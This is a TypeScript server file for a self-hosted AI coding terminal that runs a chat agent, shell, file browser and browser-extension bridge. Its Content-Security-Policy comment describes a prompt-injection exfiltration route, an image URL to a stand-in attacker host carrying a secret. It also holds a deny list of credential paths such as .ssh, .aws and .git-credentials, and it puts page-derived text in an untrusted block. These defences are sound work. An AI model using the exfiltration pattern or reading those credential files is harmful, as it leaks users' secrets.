import express from "express";
import { WebSocketServer } from "ws";
import { createServer, type IncomingMessage, type Server } from "node:http";
import { mkdirSync } from "node:fs";
import { pipeline } from "node:stream";
import { fileURLToPath } from "node:url";
import { dirname, join, resolve } from "node:path";
import { homedir } from "node:os";
import { Manager } from "./conversation.js";
import { BrowserBridge } from "./browser.js";
import * as files from "./files.js";
import { pruneScreenshots } from "./screenshots.js";
import { UsageLog } from "./usage.js";
import { WatchRegistry } from "./watches.js";
import { PromptStore, hostOf, fill } from "./prompts.js";
import { resolveProject } from "./projects.js";
import { ZipFile } from "yazl";
import { heartbeat } from "./heartbeat.js";
import { createAuth, AuthRefused, type Auth, type AuthConfig } from "./auth.js";
import { attachAgent, attachShell, type AttachContext } from "./attach.js";
import { ALLOW_BYPASS, type SessionDeps } from "./session.js";
import { buildSetup } from "./setup.js";
import { toMarkdown, exportFilename } from "./export.js";
import { BrowserAllowlist, normaliseHost, LEVELS, type Level } from "./browser-allow.js";
import { readFileSync } from "node:fs";

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = join(HERE, "..");

/**
 * Everything the server needs, resolved once. `envConfig()` reads it from the
 * environment for the real process; a test passes an object and gets a server
 * on a free port with a scripted SDK and no tailscale.
 */
export type ServerConfig = {
  host: string;
  port: number;
  workspace: string;
  chatsDir: string;
  filesRoot: string;
  projectsRoot: string;
  promptsPath: string;
  usagePath: string;
  /** Standing list of sites the browser tools may use without asking; null disables the gate. */
  browserAllowPath: string | null;
  browserAllowSeed: string[];
  maxUpload: number;
  maxZip: number;
  extraOrigins: string[];
  forceLocal: boolean;
  trustedCidrSpec?: string;
  extOrigin?: string;
  /** Extra denied paths, on top of the credential defaults under HOME. */
  denyExtra: string[];
  home: string;
  /** Injection points for tests: tailscale calls and the SDK entry point. */
  authDeps?: AuthConfig["deps"];
  spawnQuery?: SessionDeps["spawnQuery"];
  titler?: SessionDeps["titler"];
  /** Whether systemd started this process; defaults to what INVOCATION_ID says. */
  systemd?: boolean;
  /** Socket heartbeat period; tests shorten it. */
  heartbeatMs?: number;
  log?: (line: string) => void;
  warn?: (line: string) => void;
};

export function envConfig(): ServerConfig {
  const csv = (v: string | undefined, sepRe: RegExp) => (v ?? "").split(sepRe).map((s) => s.trim()).filter(Boolean);
  const home = process.env.HOME ?? homedir();
  return {
    host: process.env.CODETERM_HOST ?? "127.0.0.1",
    port: Number(process.env.CODETERM_PORT ?? 8123),
    workspace: process.env.CODETERM_WORKSPACE ?? join(ROOT, "workspace"),
    chatsDir: process.env.CODETERM_CHATS ?? join(ROOT, "chats"),
    // The shell pane is already a full shell as this user, so scoping the file
    // browser tighter than that would be theatre. Root is configurable; it
    // opens in the workspace.
    filesRoot: process.env.CODETERM_FILES_ROOT ?? home,
    projectsRoot: process.env.CODETERM_PROJECTS_ROOT ?? join(home, "projects"),
    promptsPath: process.env.CODETERM_PROMPTS ?? join(ROOT, "prompts.json"),
    usagePath: process.env.CODETERM_USAGE ?? join(ROOT, "usage.json"),
    browserAllowPath: process.env.CODETERM_BROWSER_GATE === "0" ? null : join(ROOT, "browser-allow.json"),
    browserAllowSeed: csv(process.env.CODETERM_BROWSER_ALLOW, /,/),
    maxUpload: Number(process.env.CODETERM_MAX_UPLOAD ?? 100 * 1024 * 1024),
    maxZip: Number(process.env.CODETERM_MAX_ZIP ?? 500 * 1024 * 1024),
    extraOrigins: csv(process.env.CODETERM_ORIGINS, /,/),
    forceLocal: process.env.CODETERM_LOCALHOST === "1",
    trustedCidrSpec: process.env.CODETERM_TRUSTED_CIDRS,
    extOrigin: process.env.CODETERM_EXT_ORIGIN,
    denyExtra: csv(process.env.CODETERM_DENY, /:/),
    home,
  };
}

/** What `boot()` hands back: enough to drive it from a test and to stop it. */
export type Running = {
  server: Server;
  port: number;
  convo: Manager;
  bridge: BrowserBridge;
  watches: WatchRegistry;
  usage: UsageLog;
  auth: Auth;
  /** Flush, close sessions, drop sockets. Idempotent. Resolves when the listener is closed. */
  shutdown(signal?: string): Promise<void>;
};

/**
 * Content-Security-Policy on every response.
 *
 * The transcript renders model replies as HTML, and model replies are shaped by
 * untrusted page content, so a hostile page can smuggle an instruction that
 * makes a reply embed `![x](http://attacker/px?d=<secret>)`. DOMPurify strips
 * scripts and event handlers, so injected markup cannot run code — it can only
 * auto-load a subresource. Locking img/media/font/connect to our own origin
 * closes that exfiltration channel: an off-origin pixel simply never fires.
 *
 *   img/media  'self' data: blob:  — same-origin assets, inline data URIs, and
 *                                    the blob: URLs the file viewer builds
 *   connect    'self'              — the /ws and /pty sockets are same-origin;
 *                                    an injected fetch to attacker.example dies
 *   script     'unsafe-inline'     — the pages carry one inline bootstrap each;
 *                                    every real dependency is a same-origin
 *                                    /vendor file, so this only permits our own
 *                                    inline block, not injected script (which
 *                                    DOMPurify already removes)
 */
export const CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "media-src 'self' data: blob:",
  "font-src 'self' data:",
  "connect-src 'self'",
  "object-src 'none'",
  "frame-src 'self'",   // the pages download through a hidden same-origin iframe
  "base-uri 'none'",
  "form-action 'self'",
].join("; ");

/**
 * The file browser opens on the home directory, which holds the credentials
 * that would let someone bill your Claude account or SSH as you. Block those
 * subtrees even though they sit inside the root — a shell can read them, but a
 * one-click download in a browser (and a prompt-injected agent) should not.
 * Extend with CODETERM_DENY (colon-separated absolute paths).
 */
export const DENY_DEFAULTS = [
  ".claude", ".ssh", ".aws", ".config/gh", ".config/gcloud", ".gnupg",
  ".docker/config.json", ".netrc", ".git-credentials", ".kube",
];

/**
 * One line per refusal, but not without limit: a scan of an exposed port
 * must not be able to turn the journal into its own log. After DENY_LOG_BURST
 * lines in a minute the rest of that minute is summed up in one line.
 */
export const DENY_LOG_BURST = 20;

export async function boot(cfg: ServerConfig): Promise<Running> {
  const log = cfg.log ?? ((l) => console.log(l));
  const warn = cfg.warn ?? ((l) => console.warn(l));
  const { host: HOST, port: PORT, workspace: WORKSPACE, filesRoot: FILES_ROOT, maxUpload: MAX_UPLOAD, maxZip: MAX_ZIP } = cfg;

  if (HOST === "0.0.0.0" || HOST === "::") {
    throw new AuthRefused("Refusing to bind all interfaces. /pty is an ungated shell; keep it on the tailnet.");
  }
  mkdirSync(WORKSPACE, { recursive: true });

  await files.setDeniedPaths([
    ...DENY_DEFAULTS.map((p) => join(cfg.home, p)),
    ...cfg.denyExtra,
    // The server's own secrets, wherever the project sits.
    join(ROOT, ".env"),
  ]);

  // The Chrome extension dials in here; browser tools speak through it.
  const bridge = new BrowserBridge((line) => log(`[ext] ${line}`));

  /**
   * State shared across connections by design: the newest shell pane (the agent
   * reads that one) and the most recently attached chat (a new shell opens in
   * its cwd). Lives in one object so the attach loops can update it.
   */
  const state: AttachContext["state"] = { lastChat: null, activeShell: null };
  const clients = new Set<() => void>();
  const lastChatCwd = () => state.lastChat?.cwd ?? WORKSPACE;

  const watches = new WatchRegistry();
  const prompts = new PromptStore(cfg.promptsPath);
  const browserAllow = cfg.browserAllowPath ? new BrowserAllowlist(cfg.browserAllowPath, cfg.browserAllowSeed) : null;

  const convo = new Manager(
    WORKSPACE,
    cfg.chatsDir,
    cfg.projectsRoot,
    // prefer is replaced per-chat by LiveChat, which knows its own browser.
    { bridge, getShell: () => state.activeShell, watches, prompts, prefer: () => undefined, browserAllow, filesRoot: FILES_ROOT,
      ...(cfg.spawnQuery ? { spawnQuery: cfg.spawnQuery } : {}),
      ...(cfg.titler ? { titler: cfg.titler } : {}) },
  );
  convo.onListChanged = () => { for (const f of clients) f(); };

  convo.onChatRemoved = (id) => {
    const n = watches.removeForChat(id);
    if (n) log(`[watch] dropped ${n} watch(es) with the deleted chat`);
  };

  /**
   * A watch reported. Wake the chat that set it, if that chat is the one running;
   * otherwise leave it on the list for `watch list` to report.
   */
  bridge.onEvent((msg) => {
    if (msg.type !== "watch_fired") return;
    const id = String(msg.watchId ?? "");
    const detail = String(msg.detail ?? "something changed");
    const w = watches.fire(id, detail);
    if (!w) return;
    log(`[watch] fired: ${detail}`);
    // Route it to the conversation that set it. If that chat is no longer live
    // the watch stays on the list for `watch list` to report.
    const chat = convo.live(w.chatId);
    if (!chat) { log(`[watch] its chat is not live; left on the list`); return; }
    // The detail is page-derived (title/url from the extension), so it goes in
    // the untrusted block rather than inline in the instruction — the same rule
    // composePrompt applies to tab context. The description is the model's own
    // words from when it set the watch.
    chat.watchFired(
      w.description,
      detail,
      `A page watch you set has fired. You were waiting for: ${w.description}. ` +
        `The page's report is in the untrusted block above. Tell the user, briefly. ` +
        `Do not re-set the watch unless asked.`,
    );
  });

  // Expired and long-fired watches should not clutter the list forever.
  const sweeper = setInterval(() => {
    for (const w of watches.sweep()) {
      void bridge.send("watch_stop", { watchId: w.id }).catch(() => {});
    }
  }, 60_000);
  sweeper.unref();

  const auth = await createAuth({
    host: HOST, port: PORT, extraOrigins: cfg.extraOrigins,
    forceLocal: cfg.forceLocal,
    trustedCidrSpec: cfg.trustedCidrSpec,
    extOrigin: cfg.extOrigin,
    ...(cfg.authDeps ? { deps: cfg.authDeps } : {}),
  });

  let port = PORT;   // the bound port; differs from PORT only when PORT is 0 (tests)
  const app = express();

  app.use((_req, res, next) => {
    res.setHeader("Content-Security-Policy", CSP);
    res.setHeader("X-Content-Type-Options", "nosniff");
    // same-origin, not no-referrer: manage.html reads document.referrer to send a
    // phone back to /m.html, and that is a same-origin hop. Cross-origin
    // navigations still leak nothing.
    res.setHeader("Referrer-Policy", "same-origin");
    next();
  });

  let denyWindow = 0, denyCount = 0;
  function logDeny(what: string, why: string): void {
    const minute = Math.floor(Date.now() / 60_000);
    if (minute !== denyWindow) {
      if (denyCount > DENY_LOG_BURST) warn(`[deny] …and ${denyCount - DENY_LOG_BURST} more refusals in that minute`);
      denyWindow = minute; denyCount = 0;
    }
    if (++denyCount <= DENY_LOG_BURST) warn(`[deny] ${what} — ${why}`);
  }

  /**
   * Same two checks as a WebSocket upgrade. Static assets stay open — they are
   * inert without a session — but anything touching the filesystem does not.
   */
  const guard: express.RequestHandler = (req, res, next) => {
    auth.denyReason(req).then((deny) => {
      if (!deny) return next();
      logDeny(`${req.method} ${req.path}`, deny);
      res.status(403).json({ error: deny });
    }).catch((e) => res.status(500).json({ error: String(e) }));
  };

  /**
   * Chat management over HTTP, for the manage page. The websocket carries the
   * live list for the running UI; this is for curation, which does not need a
   * session open.
   */
  app.get("/chats", guard, (_req, res) => {
    res.json({ projects: convo.projects(), chats: convo.list() });
  });

  /** Full-text search. Declared before /chats/:id so "search" is not an id. */
  app.get("/chats/search", guard, (req, res) => {
    const q = typeof req.query.q === "string" ? req.query.q : "";
    if (q.trim().length < 2) { res.status(400).json({ error: "q must be at least 2 characters" }); return; }
    res.json({ q, hits: convo.search(q) });
  });

  /** The transcript as Markdown, for pasting elsewhere or keeping. */
  app.get("/chats/:id/export.md", guard, (req, res) => {
    const rec = convo.read(String(req.params.id));
    if (!rec) { res.status(404).json({ error: "no such chat" }); return; }
    const project = rec.project ? convo.projects().find((p) => p.id === rec.project)?.name : undefined;
    res.setHeader("Content-Type", "text/markdown; charset=utf-8");
    res.setHeader("Content-Disposition", `attachment; filename="${exportFilename(rec)}"`);
    res.send(toMarkdown(rec, project));
  });

  /** One chat's transcript, so the manage page is not renaming things blind. */
  app.get("/chats/:id", guard, (req, res) => {
    const rec = convo.read(String(req.params.id));
    if (!rec) { res.status(404).json({ error: "no such chat" }); return; }
    res.json(rec);
  });

  app.post("/chats/:id", guard, express.json({ limit: "64kb" }), async (req, res) => {
    try {
      const id = String(req.params.id);
      const b = req.body as { title?: string; project?: string; open?: boolean };
      // None of these wake the chat: editing a record must not cost a subprocess.
      if (typeof b.title === "string") {
        if (!convo.rename(id, b.title)) throw new Error("no such chat");
      }
      if (typeof b.project === "string") {
        if (!(await convo.setProject(id, resolveProject(convo.projects(), b.project)))) throw new Error("no such chat");
      }
      // "open in the terminal": a fresh attach lands on the newest chat, so make
      // this one the newest. The flag used to be accepted and ignored, and the
      // redirect landed on whichever chat happened to be most recent.
      if (b.open === true) {
        if (!convo.touch(id)) throw new Error("no such chat");
      }
      res.json({ ok: true });
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  app.delete("/chats/:id", guard, async (req, res) => {
    try {
      convo.remove(String(req.params.id));
      res.json({ ok: true });
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  /* Which controls actually get used. Local file, never leaves this box; it
     exists so the navigation bar can be ordered from measurement next time
     rather than from priors. */
  const usage = new UsageLog(cfg.usagePath);

  app.post("/usage", guard, express.json({ limit: "1kb" }), (req, res) => {
    res.json({ ok: usage.record(String((req.body as { control?: unknown })?.control ?? "")) });
  });

  app.get("/usage", guard, (_req, res) => {
    res.json({ counts: usage.counts() });
  });

  /** Setup & status: the answers to "is it working, and what do I do next". */
  const pkgVersion = (() => { try { return (JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")) as { version: string }).version; } catch { return "?"; } })();
  app.get("/setup", guard, (_req, res) => {
    res.json(buildSetup({
      version: pkgVersion, node: process.version, host: HOST, port, auth,
      extOrigin: cfg.extOrigin, extensionInstances: bridge.instances, readySeen: convo.readySeen,
      chats: convo.list().length, home: cfg.home, workspace: WORKSPACE, filesRoot: FILES_ROOT, projectsRoot: cfg.projectsRoot,
      bypassAllowed: ALLOW_BYPASS, systemd: cfg.systemd ?? Boolean(process.env.INVOCATION_ID),
      browserSites: browserAllow ? browserAllow.all().length : null,
    }));
  });

  /** The standing browser-site list; the card's "Always" adds here, the manage page edits it. */
  app.get("/browser-allow", guard, (_req, res) => {
    res.json({ gated: browserAllow !== null, hosts: browserAllow?.all() ?? [] });
  });
  app.post("/browser-allow", guard, express.json({ limit: "4kb" }), (req, res) => {
    const b = req.body as { host?: unknown; level?: unknown };
    const host = normaliseHost(String(b?.host ?? ""));
    if (!host) { res.status(400).json({ error: "not a hostname (use example.com or *.example.com)" }); return; }
    if (b.level !== undefined && !(LEVELS as readonly unknown[]).includes(b.level)) { res.status(400).json({ error: "level must be read or act" }); return; }
    if (!browserAllow) { res.status(400).json({ error: "the browser gate is disabled (CODETERM_BROWSER_GATE=0)" }); return; }
    const level = (b.level as Level | undefined) ?? "act";
    // add raises; set lowers — the page wants "make it exactly this"
    const changed = browserAllow.add(host, level) || browserAllow.set(host, level);
    res.json({ added: changed, hosts: browserAllow.all() });
  });
  app.delete("/browser-allow/:host", guard, (req, res) => {
    res.json({ removed: browserAllow?.remove(String(req.params.host)) ?? false, hosts: browserAllow?.all() ?? [] });
  });

  app.get("/projects", guard, (_req, res) => {
    res.json({ projects: convo.projects() });
  });

  /**
   * Which prompts apply right now. The active tab is resolved here rather than
   * in the client, so the plain web UI — which has no idea what your browser is
   * showing — gets the same domain-scoped list as the side panel.
   */
  app.get("/prompts", guard, async (_req, res) => {
    const tab = (await bridge.activeTab()) ?? {};
    const host = hostOf(tab.url);
    res.json({
      host,
      url: tab.url ?? "",
      title: tab.title ?? "",
      hasSelection: Boolean(tab.selection),
      prompts: prompts.for(host).map((p) => ({ ...p, filled: fill(p.text, tab) })),
      all: prompts.all(),
    });
  });

  app.post("/prompts", guard, express.json({ limit: "256kb" }), (req, res) => {
    try {
      const b = req.body as { id?: string; title?: string; text?: string; domains?: string[] };
      res.json(prompts.upsert({ id: b.id, title: String(b.title ?? ""), text: String(b.text ?? ""), domains: b.domains ?? [] }));
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  app.delete("/prompts/:id", guard, (req, res) => {
    res.json({ removed: prompts.remove(String(req.params.id)) });
  });

  app.get("/files/info", guard, async (_req, res) => {
    // Where the browser should open: the agent's workspace when it sits under
    // the browsable root, else the root itself.
    let start = "";
    try { start = files.toRel(FILES_ROOT, await files.safePath(FILES_ROOT, WORKSPACE)); } catch { start = ""; }
    res.json({ root: FILES_ROOT, start, maxUpload: MAX_UPLOAD, cwd: lastChatCwd() });
  });

  /** @file completion: paths under `path` (the chat's cwd, relative to the files root) matching `q`. */
  app.get("/files/suggest", guard, async (req, res) => {
    try {
      const q = typeof req.query.q === "string" ? req.query.q : "";
      res.json({ files: await files.suggest(FILES_ROOT, typeof req.query.path === "string" ? req.query.path : undefined, q) });
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  app.get("/files/list", guard, async (req, res) => {
    try {
      res.json(await files.list(FILES_ROOT, typeof req.query.path === "string" ? req.query.path : undefined));
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  app.get("/files/read", guard, async (req, res) => {
    try {
      const path = String(req.query.path ?? "");
      const f = await files.statFile(FILES_ROOT, path);
      if (req.query.preview === "1") {
        const t = await files.readTextPreview(f.abs, 256 * 1024);
        res.json(t ? { kind: "text", name: f.name, ...t } : { kind: "binary", name: f.name, bytes: f.size });
        return;
      }
      // ?inline=1: open in the browser's own viewer for the type (PDF viewer,
      // image, plain text); unknown types, and HTML/SVG (never as a page on
      // this origin), stay downloads. Otherwise let the browser name the
      // download; the client also sets its own.
      const inline = req.query.inline === "1" ? files.inlineType(f.name) : null;
      if (inline) {
        res.setHeader("Content-Type", inline);
        res.setHeader("Content-Disposition", `inline; filename="${encodeURIComponent(f.name)}"`);
        // belt and braces for anything the browser might render: no scripts, no origin
        if (!inline.startsWith("application/pdf")) res.setHeader("Content-Security-Policy", "sandbox; default-src 'none'");
      } else {
        res.setHeader("Content-Disposition", `attachment; filename="${encodeURIComponent(f.name)}"`);
      }
      res.setHeader("Content-Length", String(f.size));
      // pipeline, not pipe: a client that goes away mid-download destroys the
      // file stream too, instead of leaving it reading into a dead socket.
      pipeline(files.streamFile(f.abs), res, () => {});
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  /**
   * Zip a selection. Streamed straight to the response rather than written to a
   * temp file: the whole point is to hand over a large selection, and nothing
   * needs it on disk. JSON from the extension's fetch; a urlencoded form from
   * the same-origin pages, whose browser streams the zip to disk instead of
   * buffering it.
   */
  app.post("/files/zip", guard, express.json({ limit: "256kb" }), express.urlencoded({ extended: false, limit: "256kb" }), async (req, res) => {
    try {
      const b = req.body as { path?: string; names?: string[] | string };
      const raw = Array.isArray(b.names) ? b.names : typeof b.names === "string" ? [b.names] : [];
      const names = raw.filter((n): n is string => typeof n === "string");
      if (!names.length) throw new Error("nothing selected");

      const { entries, bytes } = await files.collectForZip(FILES_ROOT, b.path, names, MAX_ZIP);
      if (!entries.length) throw new Error("nothing to zip — the selection held no files");
      // ?check=1: the same-origin pages download through a hidden iframe, where
      // an error body is invisible. They ask first, then submit the form.
      if (req.query.check === "1") { res.json({ ok: true, files: entries.length, bytes }); return; }

      const stem = names.length === 1 ? names[0].replace(/\W+/g, "-") : "selection";
      res.setHeader("Content-Type", "application/zip");
      res.setHeader("Content-Disposition", `attachment; filename="${stem}.zip"`);
      log(`[zip] ${entries.length} file(s), ${(bytes / 1024).toFixed(0)}KB`);

      const zip = new ZipFile();
      for (const e of entries) zip.addFile(e.abs, e.name);
      pipeline(zip.outputStream, res, () => {});
      zip.end();
    } catch (e) {
      // If the stream already started, a JSON error would corrupt the zip.
      if (res.headersSent) { res.destroy(); return; }
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  // Streamed to disk. express.raw() held the whole body in memory — up to
  // MAX_UPLOAD (100 MB) per request — which is the same OOM shape as the old
  // file preview, just on the write side.
  app.post("/files/upload", guard, async (req, res) => {
    try {
      const name = String(req.query.name ?? "");
      const dir = typeof req.query.path === "string" ? req.query.path : undefined;
      if (!name) throw new Error("missing ?name=");
      res.json(await files.saveUploadStream(FILES_ROOT, dir, name, req, MAX_UPLOAD));
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  app.post("/files/mkdir", guard, express.json({ limit: "4kb" }), async (req, res) => {
    try {
      const b = req.body as { path?: string; name?: string };
      if (typeof b.name !== "string") throw new Error("missing name");
      res.json(await files.makeDirectory(FILES_ROOT, typeof b.path === "string" ? b.path : undefined, b.name));
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  /* The mobile page shares the side panel's script and stylesheet verbatim.
     MV3 forbids remote code, so the extension must load them from disk — serving
     those same two files here keeps mobile and the panel from drifting apart
     instead of maintaining a second copy. */
  app.get("/m/app.js", (_req, res) => res.type("js").sendFile(join(ROOT, "extension/sidepanel.js")));
  app.get("/m/panel.css", (_req, res) => res.type("css").sendFile(join(ROOT, "extension/panel.css")));
  /* Bare /m is what you type on a phone. */
  app.get("/m", (_req, res) => res.redirect(302, "/m.html"));

  app.use(express.static(join(ROOT, "public")));
  app.use("/vendor/xterm", express.static(join(ROOT, "node_modules/@xterm/xterm")));
  app.use("/vendor/addon-fit", express.static(join(ROOT, "node_modules/@xterm/addon-fit")));
  app.use("/vendor/addon-web-links", express.static(join(ROOT, "node_modules/@xterm/addon-web-links")));
  app.use("/vendor/marked", express.static(join(ROOT, "node_modules/marked/lib")));
  app.use("/vendor/dompurify", express.static(join(ROOT, "node_modules/dompurify/dist")));

  const server = createServer(app);
  // Default maxPayload is 100 MB, JSON.parsed in one go. The largest legitimate
  // frame is a screenshot data URL over /ext (a few MB); 32 MB leaves headroom.
  const wss = new WebSocketServer({ noServer: true, maxPayload: 32 * 1024 * 1024 });

  const ctx: AttachContext = { convo, bridge, filesRoot: FILES_ROOT, workspace: WORKSPACE, clients, state };

  server.on("upgrade", async (req: IncomingMessage, socket, head) => {
    const route = new URL(req.url ?? "/", `http://${req.headers.host}`).pathname;
    if (route !== "/ws" && route !== "/pty" && route !== "/ext") {
      socket.write("HTTP/1.1 404 Not Found\r\n\r\n");
      socket.destroy();
      return;
    }

    const deny = await auth.denyReason(req);
    if (deny) {
      logDeny(route, deny);
      socket.write("HTTP/1.1 403 Forbidden\r\n\r\n");
      socket.destroy();
      return;
    }

    wss.handleUpgrade(req, socket, head, (ws) => {
      // The extension speaks {type}, the panel and pty speak {kind}.
      heartbeat(ws, cfg.heartbeatMs ?? 30_000, route === "/ext" ? '{"type":"ping"}' : '{"kind":"ping"}');
      if (route === "/ws") attachAgent(ws, ctx, new URL(req.url ?? "/", "http://x").searchParams.get("observe") !== "1");
      else if (route === "/ext") bridge.attach(ws);
      else attachShell(ws, ctx);
    });
  });

  /**
   * At boot this can start before tailscaled has assigned the address, and
   * binding a not-yet-existent IP fails with EADDRNOTAVAIL. Retry rather than
   * die, so the unit does not need to guess at ordering — this also covers
   * tailscale restarting or the address changing under us.
   */
  port = await new Promise<number>((resolveListen, rejectListen) => {
    function listenWithRetry(attempt = 0): void {
      const onError = (err: NodeJS.ErrnoException) => {
        const retryable = err.code === "EADDRNOTAVAIL" || err.code === "EADDRINUSE";
        if (!retryable) { rejectListen(err); return; }
        const wait = Math.min(30_000, 1000 * 2 ** Math.min(attempt, 5));
        warn(`bind ${HOST}:${PORT} failed (${err.code}); retrying in ${wait / 1000}s`);
        server.removeListener("error", onError);
        setTimeout(() => listenWithRetry(attempt + 1), wait);
      };
      server.once("error", onError);
      server.listen(PORT, HOST, () => {
        server.removeListener("error", onError);
        resolveListen((server.address() as { port: number }).port);
      });
    }
    listenWithRetry();
  });

  log(`code-terminal  http://${HOST}:${port}`);
  for (const line of auth.banner()) log(line);
  log(`workspace      ${WORKSPACE}`);
  log(`shell          /pty — real PTY, NO approval gate`);
  log(`browser        /ext — extension bridge, tools ungated`);
  log(`files          ${FILES_ROOT} (browse, upload, download)`);
  log(`projects       ${cfg.projectsRoot}`);

  // A restart is a good moment to drop what the previous run left behind.
  void pruneScreenshots().then((n) => { if (n) log(`[shots] pruned ${n} old screenshots`); }).catch(() => {});

  // systemd stops the unit with SIGTERM. Without this the process died mid
  // debounce: up to 400ms of transcript and 1s of usage counts were lost on
  // every restart, and the SDK children were killed by the cgroup rather than
  // closed.
  let stopping: Promise<void> | null = null;
  const shutdown = (signal = "shutdown"): Promise<void> => {
    if (stopping) return stopping;
    stopping = new Promise<void>((done) => {
      log(`[${signal}] shutting down`);
      clearInterval(sweeper);
      try { convo.shutdown(); } catch (e) { warn(`shutdown: chats ${String(e)}`); }
      try { usage.save(); } catch (e) { warn(`shutdown: usage ${String(e)}`); }
      for (const ws of wss.clients) ws.close(1001, "server restarting");
      server.close(() => done());
      // Keep-alive connections would hold close() open; the sockets are told.
      server.closeAllConnections?.();
    });
    return stopping;
  };

  return { server, port, convo, bridge, watches, usage, auth, shutdown };
}

/* ---------------- the process ---------------- */

const isMain = process.argv[1] !== undefined && resolve(process.argv[1]) === fileURLToPath(import.meta.url);

if (isMain) {
  let running: Running;
  try {
    running = await boot(envConfig());
  } catch (e) {
    if (e instanceof AuthRefused) { console.error(e.message); process.exit(1); }
    throw e;
  }
  const stop = (signal: string) => {
    void running.shutdown(signal);
    // The SDK subprocesses take a moment to exit after their input ends; give
    // them that, then leave regardless.
    setTimeout(() => process.exit(0), 1500).unref();
  };
  process.on("SIGTERM", () => stop("SIGTERM"));
  process.on("SIGINT", () => stop("SIGINT"));
}
